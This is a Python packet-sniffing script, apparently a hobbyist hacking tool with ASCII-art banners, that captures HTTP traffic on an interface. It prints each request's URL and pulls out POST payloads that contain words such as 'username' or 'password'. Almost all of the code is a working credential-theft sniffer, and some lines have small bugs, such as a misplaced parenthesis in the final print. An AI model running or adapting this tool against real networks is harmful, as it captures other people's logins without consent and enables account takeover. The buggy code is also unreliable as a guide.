#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http

print(''' 
    ____             __        __     _____       _ ________         
   / __ \____ ______/ /_____  / /_   / ___/____  (_) __/ __/__  _____
  / /_/ / __ `/ ___/ //_/ _ \/ __/   \__ \/ __ \/ / /_/ /_/ _ \/ ___/
 / ____/ /_/ / /__/ ,< /  __/ /_    ___/ / / / / / __/ __/  __/ /    
/_/    \__,_/\___/_/|_|\___/\__/   /____/_/ /_/_/_/ /_/  \___/_/     
                                                                     
      
''')
print('''                    #### 5H4D0W-R007 #####
XX   MMMMMMMMMMMMMMMMss'''                          '''ssMMMMMMMMMMMMMMMM   XX
XX   MMMMMMMMMMMMyy''                                    ''yyMMMMMMMMMMMM   XX
XX   MMMMMMMMyy''                                            ''yyMMMMMMMM   XX
XX   MMMMMy''                                                    ''yMMMMM   XX
XX   MMMy'                                                          'yMMM   XX
XX   Mh'                                                              'hM   XX
XX   -                                                                  -   XX
XX                                                                          XX
XX   ::                                                                ::   XX
XX   MMhh.        ..hhhhhh..                      ..hhhhhh..        .hhMM   XX
XX   MMMMMh   ..hhMMMMMMMMMMhh.                .hhMMMMMMMMMMhh..   hMMMMM   XX
XX   ---MMM .hMMMMdd:::dMMMMMMMhh..        ..hhMMMMMMMd:::ddMMMMh. MMM---   XX
XX   MMMMMM MMmm''      'mmMMMMMMMMyy.  .yyMMMMMMMMmm'      ''mmMM MMMMMM   XX
XX   ---mMM ''             'mmMMMMMMMM  MMMMMMMMmm'             '' MMm---   XX
XX   yyyym'    .              'mMMMMm'  'mMMMMm'              .    'myyyy   XX
XX   mm''    .y'     ..yyyyy..  ''''      ''''  ..yyyyy..     'y.    ''mm   XX
XX           MN    .sMMMMMMMMMss.   .    .   .ssMMMMMMMMMs.    NM           XX
XX           N`    MMMMMMMMMMMMMN   M    M   NMMMMMMMMMMMMM    `N           XX
XX            +  .sMNNNNNMMMMMN+   `N    N`   +NMMMMMNNNNNMs.  +            XX
XX              o+++     ++++Mo    M      M    oM++++     +++o              XX
XX                                oo      oo                                XX
XX           oM                 oo          oo                 Mo           XX
XX         oMMo                M              M                oMMo         XX
XX       +MMMM                 s              s                 MMMM+       XX
XX      +MMMMM+            +++NNNN+        +NNNN+++            +MMMMM+      XX
XX     +MMMMMMM+       ++NNMMMMMMMMN+    +NMMMMMMMMNN++       +MMMMMMM+     XX
XX     MMMMMMMMMNN+++NNMMMMMMMMMMMMMMNNNNMMMMMMMMMMMMMMNN+++NNMMMMMMMMM     XX
XX     yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMy     XX
XX   m  yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMy  m   XX
XX   MMm yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMy mMM   XX
XX   MMMm .yyMMMMMMMMMMMMMMMM     MMMMMMMMMM     MMMMMMMMMMMMMMMMyy. mMMM   XX
XX   MMMMd   ''''hhhhh       odddo          obbbo        hhhh''''   dMMMM   XX
XX   MMMMMd             'hMMMMMMMMMMddddddMMMMMMMMMMh'             dMMMMM   XX
XX   MMMMMMd              'hMMMMMMMMMMMMMMMMMMMMMMh'              dMMMMMM   XX
XX   MMMMMMM-               ''ddMMMMMMMMMMMMMMdd''               -MMMMMMM   XX
XX   MMMMMMMM                   '::dddddddd::'                   MMMMMMMM   XX
XX   MMMMMMMM-                                                  -MMMMMMMM   XX
XX   MMMMMMMMM                                                  MMMMMMMMM   XX
XX   MMMMMMMMMy                                                yMMMMMMMMM   XX
XX   MMMMMMMMMMy.                                            .yMMMMMMMMMM   XX
XX   MMMMMMMMMMMMy.                                        .yMMMMMMMMMMMM   XX
XX   MMMMMMMMMMMMMMy.                                    .yMMMMMMMMMMMMMM   XX
XX   MMMMMMMMMMMMMMMMs.                                .sMMMMMMMMMMMMMMMM   XX
XX   MMMMMMMMMMMMMMMMMMss.           ....           .ssMMMMMMMMMMMMMMMMMM   XX
XX   MMMMMMMMMMMMMMMMMMMMNo         oNNNNo         oNMMMMMMMMMMMMMMMMMMMM   XX
''')

print(''' ____  _   _ _  _   ____   _____        __    ____   ___   ___ _____ 
| ___|| | | | || | |  _ \ / _ \ \      / /   |  _ \ / _ \ / _ \___  |
|___ \| |_| | || |_| | | | | | \ \ /\ / /____| |_) | | | | | | | / / 
 ___) |  _  |__   _| |_| | |_| |\ V  V /_____|  _ <| |_| | |_| |/ /  
|____/|_| |_|  |_| |____/ \___/  \_/\_/      |_| \_\\___/ \___//_/   

''')

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
    #store=False -> Not to store packets in memory, prn -> callback function[Called everytime a packet is captured]

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
    # The combination of host and path fields in HTTP layer forms complete URL

def getcreds(packet):
    if packet.haslayer(scapy.Raw):
        # Raw layer contains POST based creds
        load = packet[scapy.Raw].load
        # Load field contains filtered out info
        possiblelist = ["user", "username", "pass", "password", "login", "creds", "credentials"]
        # A list of possible values contained in load field as set by programmer
        for i in possiblelist:
            if i in load:
                return load

def process_sniffed_packet(packet):
    #callback function
    if packet.haslayer(http.HTTPRequest):
        # install scapy_http
        # scapy doesn`t come with http filter
        #print(packet.show())
        url =get_url(packet)
        print("[+] HTTP Request: " + url)
        login_info = getcreds(packet)
        if login_info:
            print(
                "\n ------------------------------------------------------------ \n [+] Credentials: " + login_info) + "\n ------------------------------------------------------------ \n"


sniff("eth0")
